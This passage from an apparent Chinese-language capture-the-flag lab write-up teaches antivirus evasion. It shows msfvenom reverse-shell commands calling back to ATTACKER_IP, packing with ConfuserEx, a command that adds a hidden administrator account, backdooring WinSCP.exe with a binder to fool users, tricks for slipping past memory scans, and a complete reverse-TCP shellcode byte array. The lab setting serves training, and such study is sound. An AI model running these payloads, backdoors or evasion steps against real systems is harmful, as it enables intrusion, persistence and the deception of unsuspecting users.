<p>上述有效载荷文件会采用msfvenom所生成的Shellcode，并能将其注入到单独的线程中执行。因此，在实际操作时，我们需要生成一个新的Shellcode并将其填充到上述代码的<code>shellcode</code>变量中：</p>
<pre><code class="hljs scss">#在AttackBox中进行操作，在实际使用时，请填充ATTACKER_IP值
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">7478</span> -f csharp</code></pre>
<p>将上述命令生成的普通Shellcode填充到有效载荷文件中，然后，再使用以下命令在目标Windows机器中编译有效载荷文件：</p>
<pre><code class="hljs scss">#在目标Windows计算机中
C:\&gt; csc UnEncStagelessPayload.cs</code></pre>
<p>经过上述步骤，我们能够得到一个可执行文件UnEncStagelessPayload，如果我们在目标机器中将该文件上传至http://MACHINE_IP/页面，我们将发现该文件会被反病毒软件所标记。</p>
<p>tips：因为我们此时得到的可执行Payload是一个未经过编码、加密、加壳的普通无阶段有效载荷。</p>
<p>接下来，让我们对相同的有效载荷(UnEncStagelessPayload.exe)使用加壳器，我们将使用<a target="_blank" rel="noopener" href="https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0">ConfuserEx</a>加壳器来完成加壳操作，因为我们的有效载荷是在.NET上编程的。</p>
<p>注意：为了方便操作，ConfuserEx加壳器的快捷方式已被预先放置在目标虚拟机的桌面文件夹中。</p>
<p>ConfuserEx将要求我们指定一个用于在其中运行的文件夹，我们可以选择桌面作为基本目录，如下所示。设置好基本目录之后，我们将要加壳的可执行文件拖入到加壳器界面中即可：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054645.png" alt></p>
<p>让我们继续转到该加壳器的设置选项卡，并选择我们的有效载荷文件，完成选择后，点击"+"按钮为我们的有效载荷添加设置。这会创建一个名为"true"的规则，我们还需要确保启用了压缩(compression)功能。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054646.png" alt></p>
<p>我们现在编辑"true"规则并将preset(预设)项设置为Maximum：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054647.png" alt></p>
<p>最后，我们转到该加壳器的"Protect!"选项卡并点击"Protect"按钮即可：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054648.png" alt></p>
<p>完成上述操作之后，我们就已经准备好了加壳版本的有效载荷文件，我们可以将其上传至THM Antivirus检查器页面(http://MACHINE_IP/)。</p>
<p>我们也可以在AttackBox上设置好nc监听器，然后再在目标机器中执行加壳的有效载荷文件，这样我们将在攻击机终端成功得到一个反向shell：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#AttackBox</span>
user<span class="hljs-keyword">@attackbox</span>$ nc -lvp <span class="hljs-number">7478</span></code></pre>
<p>到目前为止，不会出现任何问题，但是一旦我们在攻击机上使用得到的反向shell执行命令，那么目标机器中的AV软件就会注意到我们的行为并杀死我们的shell。这是因为目标机器中的Windows Defender会挂钩某些Windows API 调用，并会在使用此类API调用时进行内存扫描。</p>
<p>tips：对于msfvenom所生成的任何shell，CreateProcess()将被调用以及被检测。</p>
<h2 id="补充">补充</h2>
<p>为了不被内存扫描所轻易发现，我们可以采取一些简单措施来避免检测：</p>
<ul>
<li>等待一段时间：我们可以再次尝试生成反向shell，并等待大约五分钟时间，然后再发送任何命令；我们可能会发现这样能够成功绕过检测，因为扫描内存是一项昂贵的操作，所以AV解决方案会在我们启动进程之后执行一段时间并最终停止。</li>
<li>使用较小的有效载荷：payload越小，被检测到的可能性就越小，如果我们使用msfvenom来执行单个命令而不是得到一个反向shell，那么AV软件将更难检测到它；</li>
</ul>
<p>为了使用msfvenom来执行单个命令，我们将执行以下msfvenom命令：</p>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">a</span> x64 -<span class="hljs-selector-tag">p</span> windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp
#这样得到的payload会更小，并且该payload最终所执行的会是单个命令。</code></pre>
<p>我们还可以使用一个简单的技巧，那就是用我们在攻击机中得到的反向shell运行<code>cmd.exe</code>，虽然这样AV将检测到我们的Payload并杀死相关进程，但是AV可能并不会杀死我们刚刚生成的新cmd.exe。</p>
<p>每个AV解决方案的行为都会有所不同，但在大多数时候，它们会采用一些类似的检测方式，因此，我们在测试时所发现的任何奇怪行为都值得探索。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054649.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054650.png" alt></p>
<h1 id="0x10-绑定器binders">0x10 绑定器(Binders)</h1>
<p>虽然绑定器(binder)不是AV绕过方法，但是它在我们设计一个将被分发给最终用户的恶意有效载荷时也很重要。binder是一种可以将两个或两个以上的可执行文件合并为单个可执行文件的程序。当我们想要分发隐藏在另一个已知程序中的有效载荷时，通常会使用绑定器来欺骗用户，以使用户相信他们正在执行一个另外的程序。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054651.png" alt></p>
<p>虽然每个绑定器的工作方式可能略有不同，但是它们基本上都会将我们的Shellcode代码添加到合法的程序中并以某种方式执行它。</p>
<p>例如，我们可以更改PE标头中的入口点(见上图)，以便shellcode代码提前执行，然后在完成Shellcode执行之后，再将执行流程重定向回合法的程序代码处。这样，当用户点击执行经过绑定器处理得到的可执行文件时，我们的Shellcode将首先以静默方式执行，然后会继续正常运行普通程序代码，让用户难以注意到。</p>
<h2 id="使用msfvenom进行绑定处理">使用msfvenom进行绑定处理</h2>
<p>我们可以使用msfvenom轻松地将我们想要使用的有效载荷植入到任何.exe文件中，被植入内容的二进制文件将正常工作，但会静默执行额外的有效载荷。</p>
<p>msfvenom所使用的绑定处理方法和我们刚才介绍的绑定器的机制相比略有不同，但效果一致，它将通过创建一个额外的线程来注入恶意程序。拥有一个单独的线程效果会更好，因为如果我们的Shellcode由于某种原因执行失败，我们的正常程序也不会被阻塞。</p>
<p>接下来，我们将对目标机器上的<code>C:\Tools\WinSCP</code>可执行文件进行后门化处理。</p>
<p>要创建一个WinSCP.exe后门，我们可以在目标Windows机器上使用以下命令：</p>
<pre><code class="hljs scss">#目标Windows机器上也安装了Metasploit，但在Windows上使用msf来生成Payload可能需要长达三分钟的时间(可以安全地忽略生成的警告)。
#最好还是使用AttackBox生成Payload。
#在实际使用以下命令时，请填充ATTACKER_IP值

C:\&gt; msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=<span class="hljs-number">7779</span> -f exe -o WinSCP-evil.exe</code></pre>
<p>上述生成的WinSCP-evil.exe将在用户没有注意到的情况下执行reverse_tcp meterpreter有效载荷。我们将预先在AttackBox上设置一个nc监听器，这样当我们在目标机上执行后门化的可执行文件时，它就会让我们在攻击机上获得一个反向shell，同时还会继续为目标机上的用户执行正常的WinSCP.exe：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054652.png" alt></p>
<h2 id="绑定器和avs反病毒">绑定器和AVs(反病毒)</h2>
<p>Binders(绑定器)并不会做太多事情来隐藏我们的payload以面对AV解决方案，在不进行任何更改的情况下，即使我们通过简单地合并两个可执行文件得到了单个可执行文件，这个单个可执行文件仍然会触发原始Payload所对应的任何签名。</p>
<p>绑定器的主要用途是欺骗目标计算机上的用户，让他们相信他们正在执行合法的可执行文件而不是恶意有效载荷。</p>
<p>当我们创建实际的有效载荷时，可以组合使用编码、加密和加壳来隐藏Shellcode以对抗基于签名的反病毒软件，同时我们还能将处理过的Payload绑定到目标机器上已知的其他可执行文件中，这样用户就不知道他们正在执行恶意有效载荷。</p>
<p>我们可以尝试将经过绑定处理得到的包含Payload的可执行文件上传到THM Antivirus Check页面(此页面在目标机桌面上有对应链接)，注意，我们在此不做任何加壳处理，最终我们会从THM Antivirus Check相关的服务器得到一个返回的检测结果，我们会发现已上传的这个可执行文件将被标记为恶意软件。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054653.png" alt></p>
<h1 id="0x11-最终实验任务">0x11 最终实验任务</h1>
<p>结合上文所介绍的各种AV规避技术，尝试绕过实验虚拟机上已安装的反病毒软件的检测，进而捕获目标文件系统中的flag内容。</p>
<p>tips：我们将在<code>http://MACHINE_IP/</code>(完成实验机器部署后，我们将得到随机分配的目标IP)页面上传文件，此页面的链接可以在目标机器的桌面上找到。</p>
<p>在目标机器中新建一个具有如下内容的AVchecker.cs文件：</p>
<pre><code class="hljs cs"><span class="hljs-comment">//AVchecker.cs</span>
<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Management;

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
{
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span>
    {
        <span class="hljs-keyword">var</span> status = <span class="hljs-literal">false</span>;
        Console.WriteLine(<span class="hljs-string">"[+] Antivirus check is running .. "</span>);
        <span class="hljs-built_in">string</span>[] AV_Check = { 
            <span class="hljs-string">"MsMpEng.exe"</span>, <span class="hljs-string">"AdAwareService.exe"</span>, <span class="hljs-string">"afwServ.exe"</span>, <span class="hljs-string">"avguard.exe"</span>, <span class="hljs-string">"AVGSvc.exe"</span>, 
            <span class="hljs-string">"bdagent.exe"</span>, <span class="hljs-string">"BullGuardCore.exe"</span>, <span class="hljs-string">"ekrn.exe"</span>, <span class="hljs-string">"fshoster32.exe"</span>, <span class="hljs-string">"GDScan.exe"</span>, 
            <span class="hljs-string">"avp.exe"</span>, <span class="hljs-string">"K7CrvSvc.exe"</span>, <span class="hljs-string">"McAPExe.exe"</span>, <span class="hljs-string">"NortonSecurity.exe"</span>, <span class="hljs-string">"PavFnSvr.exe"</span>, 
            <span class="hljs-string">"SavService.exe"</span>, <span class="hljs-string">"EnterpriseService.exe"</span>, <span class="hljs-string">"WRSA.exe"</span>, <span class="hljs-string">"ZAPrivacyService.exe"</span> 
        };
        <span class="hljs-keyword">var</span> searcher = <span class="hljs-keyword">new</span> ManagementObjectSearcher(<span class="hljs-string">"select * from win32_process"</span>);
        <span class="hljs-keyword">var</span> processList = searcher.Get();
        <span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> process <span class="hljs-keyword">in</span> processList)
        {
            <span class="hljs-built_in">int</span> _index = Array.IndexOf(AV_Check, process[<span class="hljs-string">"Name"</span>].ToString());
            <span class="hljs-keyword">if</span> (_index &gt; <span class="hljs-number">-1</span>)
            {
                Console.WriteLine(<span class="hljs-string">"--AV Found: {0}"</span>, process[<span class="hljs-string">"Name"</span>].ToString());
                status = <span class="hljs-literal">true</span>;
            }
            i++;
        }
        <span class="hljs-keyword">if</span> (!status) { Console.WriteLine(<span class="hljs-string">"--AV software is not found!"</span>);  }
    }
}</code></pre>
<p>之后编译运行，得到如下图所示结果，我们对照即可得到WinDefend</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054654.png" alt></p>
<p>回顾上述的免杀手法，其中我们可以尝试进行编码，加壳的方式来绕过AV</p>
<pre><code class="hljs scss">byte<span class="hljs-selector-attr">[]</span> buf = new byte<span class="hljs-selector-attr">[460]</span> {<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xe8,
<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x60,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x72,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xb7,<span class="hljs-number">0</span>x4a,<span class="hljs-number">0</span>x4a,
<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>xac,<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x7c,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x2c,
<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>xed,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x51,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x42,<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x8b,
<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,
<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x20,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>xe3,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x34,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd6,
<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>xac,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x38,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xf1,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x03,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x45,
<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>xd1,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xd8,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>x66,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x0c,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x1c,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x04,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>xd0,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x5e,
<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xec,<span class="hljs-number">0</span>x20,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x52,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x58,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x5a,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x12,<span class="hljs-number">0</span>xe9,
<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>x5d,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xbe,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x5f,<span class="hljs-number">0</span>x33,
<span class="hljs-number">0</span>x32,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xec,<span class="hljs-number">0</span>xa0,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe5,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xbc,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x15,<span class="hljs-number">0</span>xb3,
<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x0e,<span class="hljs-number">0</span>x4f,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe4,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xf1,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x77,<span class="hljs-number">0</span>x26,<span class="hljs-number">0</span>x07,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xea,<span class="hljs-number">0</span>x68,
<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x29,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>x6b,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>xff,
<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc9,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,
<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>xea,
<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>xdf,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x10,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x58,
<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x99,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x74,<span class="hljs-number">0</span>x61,
<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xc4,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>x02,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x63,
<span class="hljs-number">0</span>x6d,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x48,
<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x0d,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>xe2,<span class="hljs-number">0</span>xfc,<span class="hljs-number">0</span>x66,<span class="hljs-number">0</span>xc7,<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x54,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x8d,
<span class="hljs-number">0</span>x44,<span class="hljs-number">0</span>x24,<span class="hljs-number">0</span>x18,<span class="hljs-number">0</span>xc6,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x68,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xe6,<span class="hljs-number">0</span>x56,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>x49,<span class="hljs-number">0</span>xff,
<span class="hljs-number">0</span>xc8,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xc1,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x79,<span class="hljs-number">0</span>xcc,<span class="hljs-number">0</span>x3f,
<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x31,<span class="hljs-number">0</span>xd2,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xca,<span class="hljs-number">0</span>x8b,<span class="hljs-number">0</span>x0e,<span class="hljs-number">0</span>x41,
<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>x08,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x1d,<span class="hljs-number">0</span>x60,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xf0,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>xa2,<span class="hljs-number">0</span>x56,
<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>xba,<span class="hljs-number">0</span>xa6,<span class="hljs-number">0</span>x95,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>x9d,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>x83,<span class="hljs-number">0</span>xc4,<span class="hljs-number">0</span>x28,
<span class="hljs-number">0</span>x3c,<span class="hljs-number">0</span>x06,<span class="hljs-number">0</span>x7c,<span class="hljs-number">0</span>x0a,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xfb,<span class="hljs-number">0</span>xe0,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>x05,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>x13,
<span class="hljs-number">0</span>x72,<span class="hljs-number">0</span>x6f,<span class="hljs-number">0</span>x6a,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x89,<span class="hljs-number">0</span>xda,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd5};</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054655.png" alt></p>
